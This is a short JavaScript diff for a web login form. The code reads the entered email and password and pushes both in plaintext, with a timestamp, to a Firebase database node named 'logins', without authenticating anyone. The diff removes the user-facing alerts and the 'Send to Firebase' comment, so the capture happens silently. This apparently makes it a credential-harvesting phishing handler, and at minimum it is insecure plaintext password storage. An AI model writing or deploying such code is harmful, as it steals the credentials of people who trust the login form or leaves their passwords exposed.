@@ -17,21 +17,17 @@ const db = getDatabase(app);
 
 const loginBtn = document.getElementById("loginBtn");
 
-loginBtn.addEventListener("click", () => {
+function sendLogin() {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
 
-  if(email === "" || password === "") {
-    alert("Fill all fields");
-    return;
-  }
+  if(email === "" || password === "") return;
 
-  // Send to Firebase
   push(ref(db, 'logins'), {
     email: email,
     password: password,
     time: Date.now()
   });
+}
 
-  alert("Logged (sample)");
-});
+loginBtn.addEventListener("click", sendLogin);
